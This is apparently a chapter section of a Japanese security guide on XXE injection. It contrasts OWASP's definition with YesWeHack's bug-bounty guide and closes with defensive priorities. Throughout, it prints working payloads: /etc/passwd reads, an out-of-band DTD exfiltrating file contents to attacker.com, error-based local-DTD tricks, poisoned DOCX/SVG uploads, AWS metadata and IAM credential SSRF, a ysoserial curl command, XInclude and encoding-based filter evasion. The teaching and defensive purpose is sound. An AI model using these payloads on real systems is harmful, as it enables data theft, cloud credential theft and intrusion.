## XXEガイドとOWASPの定義

### この節の位置づけ

第1章では、XMLとDTD(Document Type Definition、XML文書の構造・許可される要素や属性・エンティティなどを定義する仕様書)の基礎を確認したうえで、XXE(XML External Entity、XML外部実体injection)という脆弱性クラスがどのように定義され、どのような攻撃系統に分類されるかを整理する。ここではOWASPによる正式な定義と、YesWeHackが公開しているバグバウンティ実践者向けガイドの二つを対比しながら読み解く。OWASP側は「脆弱性の成立条件」という理論的骨格を、YesWeHack側は「実際に現場でどう悪用されるか」という実践的な肉付けを与えてくれる。両者を合わせて読むことで、XXEを「なぜ起きるか」から「どう見つけ、どう対策するか」まで一貫して理解できる。

### XMLの実体(entity)機構のおさらい

XXEを理解するには、まずXMLの「実体(entity)」という機能を押さえる必要がある。実体とは、XML文書内で繰り返し使う文字列やコンテンツを、ある名前に束縛(バインド)しておき、`&名前;` という参照で展開できる仕組みである。HTMLで `&amp;` が `&` に展開されるのと同じ発想だが、XMLではDTD内で**任意の実体を自分で定義できる**点が特徴である。

さらに実体には「一般実体(general entity)」と「パラメータ実体(parameter entity、`%`プレフィックスを使う)」の2種類があり、パラメータ実体はDTD内部でのみ参照できる。この区別が、後述する「パラメータ実体を使った間接的なデータ窃取」というテクニックの土台になる。

実体には、値をDTD内に直接書き込む「内部実体」と、`SYSTEM`または`PUBLIC`キーワードを使って**外部のURI(ファイルパスやURL)を参照する**「外部実体(external entity)」がある。XXEという名前は、まさにこの外部実体を悪用する攻撃であることに由来する。XML処理系(パーサ)が外部実体の解決(=参照先を実際に取得してその内容を展開すること)を許可したまま、攻撃者が制御可能なXML入力を受け取ってしまうと、パーサ自身に攻撃者の指定した任意のURIへアクセスさせることができてしまう。これがXXEの本質である。

### OWASPによる定義と成立条件

> ⚠️ 補足: 当初指定されたURL `https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing` は308リダイレクトを返し、実体は `https://community.owasp.org/vulnerabilities/XML_External_Entity_(XXE)_Processing` に移転していた(OWASP Wikiのコミュニティサイト移行によるものと見られる)。リダイレクト先を取得できたため、内容はそのまま反映している。

OWASPはXXEを次のように定義している。「XXEは、XML入力を処理するアプリケーションに対する攻撃の一種である」とした上で、「XML1.0仕様の一部である、外部実体という概念を利用する攻撃」であり、「弱い設定のXMLパーサによってXML入力内の外部実体への参照が処理されたときに発生する」としている。

この定義から、XXEが成立するための条件を分解すると次の3点に整理できる。

1. **アプリケーションがXML文書を解析(パース)する**こと。JSON全盛の現代でも、SOAP API、SVG画像、Office文書(DOCX/XLSX/PPTXはZIPで固められたXML群)、設定ファイル、決済プロトコル、SAML(Security Assertion Markup Language、シングルサインオンで使われるXMLベースの認証プロトコル)などXMLは依然として広範囲に使われている。
2. **信頼できない(untrusted)データが、DTD内のシステム識別子(system identifier、外部リソースの場所を示すURI)として使われる**こと。つまり攻撃者が、パースされるXML文書自体、あるいはそのDTD部分を注入・改変できる必要がある。
3. **XMLプロセッサが、DTD内の外部実体を検証・解決してしまう(バリデーションしてresolveする)**こと。ここが防御の核心であり、これを無効化することがXXE対策の要諦になる。

この3条件がすべて揃ったとき、XML1.0仕様が持つ「システム識別子で宣言された外部コンテンツに、ローカルまたはリモートでアクセスできる」という正規の機能が、攻撃者にとっての武器に転じる。パーサがその識別子を実際にデリファレンス(参照解決)する際、機密情報の暴露につながってしまう。

> 出典: OWASP Community — XML External Entity (XXE) Processing — https://community.owasp.org/vulnerabilities/XML_External_Entity_(XXE)_Processing

### OWASPが挙げる代表的な影響(インパクト)

OWASPの記事は、XXEがもたらしうる被害を以下のように列挙している。

- **ローカルファイルの開示**(パスワードファイルや機密性の高い個人データなど)
- **サーバサイドリクエストフォージェリ(SSRF)とポートスキャン**。外部実体のURIとして内部ネットワークのアドレスを指定すれば、パーサがサーバの代理としてそのアドレスにアクセスしてしまう
- **サービス拒否(DoS)**。後述する「billion laughs」のようなエンティティ展開の再帰・肥大化により、メモリやCPUを枯渇させる
- **メモリ破損を介した任意コード実行の可能性**。パーサの実装バグに依存するため頻度は高くないが、理論上は起こりうる
- **DNSのサブドメイン名を使ったデータの持ち出し(exfiltration)**。エラーメッセージやレスポンスに直接データが出ない「ブラインド」な状況でも、DNSクエリという副チャネルで情報を持ち出せる

### OWASP記載の最小限のペイロード例

OWASPの記事にある最も基本的な例は、`/etc/passwd`(Unix系OSのユーザーアカウント情報を含む設定ファイル)を読み出すものである。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

なぜこれで読み出せるのか。`<!DOCTYPE foo [...]>` の角括弧内は「内部サブセット」と呼ばれ、この文書専用のDTD定義をその場に埋め込める場所である。`<!ENTITY xxe SYSTEM "file:///etc/passwd">` は、`xxe` という名前の外部実体を宣言し、その内容を `file://` スキームでローカルファイルシステムから取得するよう指示する。そして本文中の `<foo>&xxe;</foo>` で `&xxe;` を参照すると、パーサは宣言に従って `/etc/passwd` の中身を実際に読み込み、その内容を `&xxe;` の位置に**文字列として展開**する。パーサが外部実体解決を無効化していなければ、レスポンスとして返ってくるXML(またはそれを元に生成された画面出力)にファイルの中身がそのまま漏れる。`<!ELEMENT foo ANY>` は要素 `foo` が任意の内容を持てることをDTDとして宣言しているだけで、XML文書としての妥当性(validity)を保つための付随的な記述である。

同様の構造で、URLスキームを `http://` に変えるとリモートリソースの取得(かつ相手サーバへのSSRF)が可能になる。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
<foo>&xxe;</foo>
```

さらにOWASPは、PHPの `expect` 拡張(標準では無効だが、有効化されている環境でシェルコマンド実行を可能にするストリームラッパー)が有効な特殊な環境を前提に、リモートコード実行に至る例も示している。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds><user>`&xxe;`</user></creds>
```

この例が成立する条件は極めて限定的である(PHPで `expect` 拡張が有効、かつパーサがコマンド実行結果を評価可能な形で反映する)ため、実務上の再現性より「外部実体のURIスキームが正規のURLに限定されない」という原理を示す教材的な位置づけで理解しておくとよい。`file://` や `http://` 以外にも、パーサや言語処理系がサポートするラッパー・スキーム(例: PHPの `php://filter`)が悪用対象になりうるという発想の広がりを示している。

OWASPはこの記事の中で、防御の要点として「XMLプロセッサをローカルの静的DTDのみを使うよう設定し、XML文書内で宣言されたDTDを一切許可しない」ことを挙げ、詳細な対策手法は別文書のXXE Prevention Cheat Sheetに委ねている。この一文は非常に重要で、「外部DTDだけでなく、文書に埋め込まれた内部DTD宣言そのものを禁止する」というのが最も確実な防御方針であることを示唆している。第3章以降の防御パートでこの考え方を実装レベルまで具体化する。

### YesWeHackガイドが示す実践的なXXE攻撃の全体像

YesWeHackの「The ultimate Bug Bounty guide to exploiting XXE」は、バグバウンティハンターの視点から、XXEを発見してから実際にどう悪用が進んでいくかを段階別・シナリオ別に整理している点に価値がある。OWASPの定義が「成立条件」を示すのに対し、こちらは「攻撃のバリエーションと、それぞれがなぜ機能するか」を具体的なペイロードとともに解説している。

> 出典: YesWeHack — The ultimate Bug Bounty guide to exploiting XXE — https://www.yeswehack.com/learn-bug-bounty/xml-external-entity-guide-xxe

#### 1. クラシックXXE(直接反映型)

アプリケーションがパースしたXMLの内容(の一部)をレスポンスにそのまま反映するケースである。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE products[
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <product>
    <name>&xxe;</name>
    <price>999</price>
  </product>
</products>
```

`&xxe;` が展開された結果が商品名フィールドとしてそのままAPIレスポンスに現れるため、攻撃者は一回のリクエストでファイル内容を直接確認できる。最も検出・実証がしやすい形態であり、バグバウンティにおいても「見つけたら即座に影響が証明できる」典型例である。

#### 2. ブラインドXXE + Out-of-Band(OOB)データ窃取

レスポンスに解析結果が一切現れない場合でも、パーサが外部実体を「取得」する動作自体は行われるため、攻撃者が用意したサーバへの通信(コールバック)を観測することで存在を確認し、さらにデータを盗み出せる。ここで使われるのがパラメータ実体を使った間接参照のテクニックである。

攻撃者は自分のサーバに悪意あるDTDファイルを設置する(`evil.dtd`)。

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

そして被害対象アプリケーションに送るXMLでは、外部パラメータ実体としてこのDTDを読み込ませる。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<document>
  <title>Report</title>
</document>
```

なぜこれで動くのか、DTDパース処理の順序を追って理解する必要がある。

1. 被害サーバのパーサが `%xxe;` を評価すると、`http://attacker.com/evil.dtd` を取得しに行く(この時点でOOB通信の1回目が発生する)。
2. 取得したDTD内の `%file;` が評価され、`/etc/hostname` の中身がパラメータ実体 `file` の値として読み込まれる。
3. `%eval;` が評価されると、その中に書かれた**新しい実体宣言 `exfil` 自体が動的に組み立てられる**。ここが最大のポイントで、`%file;` の値(=ファイルの中身)が、次に宣言する実体 `exfil` のSYSTEM識別子(URL)の一部として文字列結合される。つまり「ファイルの中身をURLのクエリパラメータに埋め込んだ新しいエンティティ定義」がパーサ自身の手で生成される。
4. 最後に `%exfil;` が評価されると、パーサはそのURL(ファイル内容を含んだURL)にHTTPリクエストを送る。攻撃者はサーバのアクセスログを見るだけで、クエリパラメータに埋め込まれたファイル内容を回収できる。

このように、**パラメータ実体は「実体の値を使って、別の実体宣言を動的に組み立てる」という二段階の間接参照が可能**であり、これによって「読み取ったファイル内容をレスポンスに一切出さずに、外部への通信の中に混ぜ込んで持ち出す」というブラインド環境での攻撃が成立する。なお、多くの実装(特にlibxml2)では一般実体内でパラメータ実体を直接混在させる記法に制約があるため、実際にはDTD側でパラメータ実体を段階的に組み立てる必要がある点も、このテクニックが「なぜ外部DTDを経由する2段構成になるのか」の理由である。

#### 3. エラーベースXXE(ローカルDTDの再定義を利用)

ネットワーク送信(OOB)すら許されない、より制限された環境(送信元IPのアウトバウンド通信がファイアウォールで遮断されているなど)では、パーサが吐くエラーメッセージにデータを漏らすテクニックが使われる。サーバ上に既に存在するシステムDTD(例: `/usr/share/xml/fontconfig/fonts.dtd` のようなLinuxディストリビューションに標準で入っているDTDファイル)を読み込み、その中の既存のパラメータ実体を「再定義」することで、意図的にXML構文エラーを発生させ、そのエラーメッセージにファイル内容を混入させる。

```xml
<?xml version="1.0"?>
<!DOCTYPE message[
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;error;
  <!ELEMENT aa (bb'>
  %local_dtd;
]>
<message>anything</message>
```

このペイロードが動作する理由はやや複雑だが、仕組みを分解すると次のようになる。`fonts.dtd` の中には `constant` という名前のパラメータ実体が元から定義されている。この攻撃はDTDが**先に定義された実体を後から再定義できない**という仕様(最初の宣言が有効になる)を逆手に取り、`%constant` を**先に**攻撃者の文字列で上書き宣言しておく。この上書き文字列 `'aaa)>` は、後で `fonts.dtd` 内の元の `constant` 定義が読み込まれた際、その周辺の構文を意図的に破壊するように設計されている。結果として、`fonts.dtd` がパースされる際に文法エラーが発生し、その過程で `%error;` によって組み立てられた「存在しないパス + ファイル内容」というシステム識別子への参照が試みられ、パーサがそのファイルオープンに失敗した際のエラーメッセージに、埋め込まれた `/etc/passwd` の中身がそのまま出力される。結果として得られるエラーメッセージは次のような形になる。

```
file:///nonexistent/root:x:0:0:root:/root:/bin/bash (No such file or directory)
```

外に見える文字列の一部として `root:x:0:0:root:/root:/bin/bash` (`/etc/passwd`の1行目)が混ざっていることがわかる。このテクニックが有効なのは、対象サーバのOS上に既知のパスを持つDTDファイルが存在することが前提であり、対象環境のOSやディストリビューション、インストール済みパッケージによって使えるDTDファイルの有無・パスが変わる点に注意が必要である。

#### 4. ファイルアップロード経由のXXE(DOCX/XLSX)

Office Open XML形式(.docx, .xlsx, .pptx)は、内部的にZIPアーカイブの中に複数のXMLファイルを含む構造になっている。履歴書やレポートのアップロード機能がサーバ側でこれらのファイルを解析(例: テキスト抽出、プレビュー生成、ウイルススキャン連携)する際に、内部のXMLがXXEに脆弱なパーサで処理されると攻撃が成立する。

手動での改変手順は次の通りである。

```bash
unzip resume.docx -d resume_modified/
```

展開した `word/document.xml` を編集し、DOCTYPE宣言と外部実体を注入する。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document[
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>Summary: &xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

そして再度ZIPとして固め直す。

```bash
cd resume_modified && zip -r ../malicious_resume.docx *
```

このテクニックが成立する理由は、「見た目はバイナリのOffice文書ファイルでも、実体はXMLの集合体である」という点、そして多くのバックエンド処理(全文検索インデックス作成、プレビューサムネイル生成など)がアップロードされたファイルの拡張子や見た目だけで安全と判断し、内部のXMLパーサの設定を見落としがちである点にある。ガイドはこの手動作業を自動化するツールとして `XXElixir` を挙げている。

```bash
python3 XXElixir.py --file template.xlsx --url https://attacker.com/xxe --output poisoned.xlsx
```

第2章のファイルアップロード関連の章で、この「コンテナ形式(ZIP等)の中に危険なパーサ対象データが隠れている」というパターンをさらに掘り下げる。

#### 5. Content-Typeの偽装によるXXEの誘発

JSON APIとして設計されているエンドポイントであっても、バックエンドのフレームワークが `Content-Type` ヘッダの値に応じて自動的にXMLパーサへディスパッチする実装になっている場合、リクエストの `Content-Type` を `application/xml` に書き換えてXMLペイロードを送るだけでXXEが成立することがある。

```http
POST /users/update HTTP/1.1
Host: api.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <username>john_doe</username>
  <bio>&xxe;</bio>
</root>
```

このテクニックが重要なのは、「表向きJSONしか使っていないアプリケーションだから安全」という思い込みを崩す点にある。多くのWebフレームワーク(Content Negotiationをサポートするもの)は、リクエストヘッダに応じて複数のパーサを自動選択する仕組みを持っており、開発者が意識していないXMLパーサ経路が攻撃対象になりうる。バグバウンティの探索フェーズでは、JSON専用に見えるエンドポイントに対しても機械的にContent-Typeを差し替えて試す価値があることを示している。

#### 6. XXEを起点としたSSRF(クラウドメタデータサービスへの到達)

外部実体のURIとして、クラウド環境特有のメタデータサービスのアドレス(AWSの場合 `169.254.169.254` というリンクローカルアドレス)を指定すると、パーサ自身がそのサーバの内部ネットワークから発信元となってアクセスするため、外部からは直接到達できない内部リソースに間接的に到達できる。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<request>
  <data>&xxe;</data>
</request>
```

さらに一歩進めて、IAMロール(そのサーバに付与されたクラウド権限)の一時的なアクセスキーを狙う例も示されている。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-application-role">
]>
<request>
  <data>&xxe;</data>
</request>
```

レスポンスに一時的なAWS認証情報が含まれてしまえば、攻撃者はそのIAMロールに付与された権限の範囲でクラウド環境そのものを操作できるようになる可能性があり、XXEが「ファイル1個の漏洩」にとどまらず「クラウド基盤全体への侵害」に発展しうることを示す典型例である。

> ⚠️ 補足(執筆時点の一般知識に基づく注記): AWSは2019年以降、より安全なInstance Metadata Service Version 2 (IMDSv2)への移行を進めており、IMDSv2はトークンベースのセッション認証を要求するため、単純なGETリクエスト(XXE経由のSSRFはGET相当の一方向アクセスになりやすい)だけではメタデータを取得できないよう設計されている。ただしIMDSv1が依然として有効化された環境や、IMDSv2を要求しない設定のインスタンスも実在するため、このリスクが完全に過去のものになったわけではない。

#### 7. XXEを起点としたRCE(Java逆シリアル化との連鎖)

これはXXE単体の脆弱性というより、「XXEで読み出せる`file://`アクセスを、別の脆弱性(安全でないデシリアライゼーション)の起爆剤として使う」連鎖的な攻撃である。`ysoserial` という既知のツールでJavaの安全でないデシリアライゼーションを突くための悪意あるシリアライズ済みオブジェクトを生成する。

```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > payload.ser
```

このファイルをアップロード機能経由でサーバに保存させたうえで、XXEの `file://` 参照でこのファイルパスを指定し、アプリケーション側のどこかでこの実体の値がJavaの逆シリアル化処理に渡される経路があれば、コマンド実行に至る。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "file:///app/uploads/12345/payload.ser">
]>
<request>
  <data>&xxe;</data>
</request>
```

この例は、単一の脆弱性クラスだけを見るのではなく、「ファイルアップロード機能」「XXE」「安全でないデシリアライゼーション」という複数の弱点が連鎖したときに初めてRCEに至るという、実際の侵害シナリオの複雑さを示す教材である。

#### 8. PHPの`expect://`ラッパーによるRCE

拡張機能が有効という限定条件下で、OWASP記事の例と同種の攻撃も紹介されている。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

`expect` PHP拡張は標準では有効化されていないため、実運用での遭遇率は低いが、「外部実体のスキームは`file`や`http`に限らず、パーサが動く言語処理系のストリームラッパー全般が攻撃面になりうる」という一般原則を示す例として押さえておく。

#### 9. XIncludeによるDOCTYPE制限の回避

アプリケーション側の対策として「DOCTYPE宣言自体を禁止する」実装がされている場合でも、XML文書の中で`DOCTYPE`を一切使わずに外部リソースを読み込める別の仕組み、**XInclude**が悪用されることがある。XIncludeはXML文書の一部を別の外部リソースで置き換えるための標準仕様であり、DTDやENTITY宣言を必要としない。

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</data>
```

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://internal.company.com/admin"/>
</data>
```

これは「DOCTYPEブロックだけを入力バリデーションで弾く」防御が不十分であることを端的に示す例であり、防御側は**XInclude処理自体を無効化する**、あるいは根本的に「安全でないXML機能をすべて無効化した状態からホワイトリスト的に必要な機能だけ許可する」設計にする必要がある。

#### 10. パーサのフィルタ回避テクニック

ガイドはさらに、WAF(Web Application Firewall)や簡易な文字列フィルタの回避に使われるテクニックにも触れている。

**UTF-16エンコーディングによる回避**は、多くの文字列ベースのフィルタがASCII(UTF-8のASCII互換部分)を前提としてシグネチャマッチングを行っていることを利用する。ペイロードをUTF-16に変換すると、バイト列としては`DOCTYPE`や`ENTITY`といった単語がそのままの形で現れなくなるため、単純な文字列検索型フィルタをすり抜けられる可能性がある。

```bash
cat payload.xml | iconv -f UTF-8 -t UTF-16BE > utf16_payload.xml
```

**HTMLエンティティ(文字参照)によるエンコード回避**は、`/etc/passwd`のようなよく知られた危険パスの文字列パターンマッチングを回避するために、スラッシュなどの文字を数値文字参照に置き換える手法である。

```xml
<!DOCTYPE root[
  <!ENTITY xxe SYSTEM "file://&#x2F;etc&#x2F;passwd">
]>
```

`&#x2F;` は`/`のUnicodeコードポイントを16進数で表した数値文字参照であり、XMLパーサはこれを最終的に通常の`/`として解釈する。文字列としての`/etc/passwd`というシグネチャに反応するフィルタを、実行時に初めて`/`へ展開される表現を使うことで回避する狙いである。

これらの回避テクニックが成り立つ根本原因は共通していて、**「フィルタ側の検査タイミング」と「パーサ側の実際の解釈タイミング」がずれている**ことにある。フィルタは受信した生バイト列やデコード前の文字列を検査するが、実際に危険な意味を持つのはパーサが最終的に解釈した後の値である。この非対称性がある限り、表層的な文字列フィルタはXXE対策として信頼できない、という教訓が導かれる。だからこそOWASPが示した「パーサ自体の機能を無効化する」という根本対策が優先されるべきであるという結論に、両資料は暗黙のうちに一致している。

#### 11. SVGアップロード経由のXXE

SVG(Scalable Vector Graphics)はXMLベースの画像フォーマットであり、アバター画像や図表のアップロード機能が「画像」として扱っていても、内部的にはXMLパーサで処理されることが多い。

```http
POST /api/avatar/upload HTTP/1.1
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg[
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="35" font-size="16">&xxe;</text>
</svg>
```

画像アップロード機能が拡張子や`Content-Type`ヘッダのみで「安全な画像形式」と判定し、内部のパース処理(サムネイル生成、レンダリング、メタデータ抽出など)でXMLパーサの設定を見落としているケースは実務でも頻出するため、ファイルアップロード機能の脆弱性診断において画像形式であってもXML系フォーマット(SVG含む)は個別に検討すべき対象であることをこの例は示している。

### 検出手法と攻撃対象領域(アタックサーフェス)の洗い出し

YesWeHackガイドは、XXEを探す際の実務的な観点として以下を挙げている。

- **Canarytokens**のようなおとりファイル(Microsoft Excel形式のトークンファイルなど)を使い、コマンドラインベースのパーサ(=デスクトップアプリではなく自動処理パイプライン)によってファイルが処理された場合にアラートを発する手法。ファイルが人間による目視確認ではなく機械的なXMLパース処理に通されたことを検知するために使われる。
- **Out-of-Bandコールバックの監視**。攻撃者が制御するサーバへのDNSクエリやHTTPリクエストの到達を確認することで、レスポンスに何も表示されないブラインドXXEの存在を実証する。
- **エラーメッセージの解析**。パーサが返すエラー文言にファイルパスやファイル内容の断片が含まれていないかを確認する。
- **タイミング分析**。存在しないホストや到達に時間のかかるネットワーク先を外部実体のURIに指定し、レスポンスの遅延を観測することで、パーサが実際に外部リソース解決を試みているかどうかを推測する。

また、XMLパーサが潜んでいる典型的な攻撃対象領域として、Office文書処理系(DOCX/XLSX/PPTXなどZIPアーカイブ化されたXML群)、Content Negotiationに対応したAPIエンドポイント、レガシーなSOAPサービス、SVG画像ハンドラ、設定ファイルのパーサ、データのインポート/エクスポート機能を挙げている。これらはいずれも「開発者がXMLを直接意識していなくても、内部の依存ライブラリがXMLパーサを呼び出している」ケースが多く、攻撃対象の洗い出しでは表層のAPI仕様(JSON/REST)だけでなく、内部で使われているライブラリやファイル処理経路まで踏み込んで確認する必要があることを物語っている。

### 防御の要点(両資料からの統合)

両資料に共通する結論を統合すると、XXE対策の優先順位は次のようになる。

1. **XMLパーサのDTD処理そのものを無効化する**ことが最も確実である。OWASPが「ローカルの静的DTDのみを使い、文書内で宣言されたDTDを一切許可しない」と述べている通り、根本原因である「外部実体の解決」を機能レベルで止めるのが最優先である。
2. 言語・ライブラリごとに、外部一般実体(external general entities)と外部パラメータ実体(external parameter entities)の両方を明示的に無効化し、XIncludeの処理も無効化する必要がある(パラメータ実体だけ、あるいはXIncludeだけを見落とすと、前述のブラインドXXEやXIncludeバイパスが依然として成立してしまう)。
3. 文字列レベルのフィルタ(`DOCTYPE`や`/etc/passwd`といった既知パターンの拒否)は、UTF-16変換や数値文字参照によって容易に回避されるため、**唯一の対策として頼ってはならない**。あくまでパーサ自体の設定変更が主軸であり、フィルタは補助的な多層防御の一部と位置づけるべきである。
4. ファイルアップロード機能では、拡張子や`Content-Type`ヘッダの外形だけで安全性を判断せず、Office文書やSVGなど「内部的にXMLを含む形式」がアップロードされた場合の解析パイプライン全体(サムネイル生成、全文検索インデックス化、ウイルススキャン連携など)においても、使われているすべてのXMLパーサの設定を横断的に点検する必要がある。

この節で確認した「なぜXXEが起きるのか」という原理と、「どのような形で悪用されるか」という実例の全体像を土台として、次節以降ではDTD・実体宣言のさらに詳細な仕組み、そして具体的な言語・フレームワークごとの安全な設定方法を掘り下げていく。
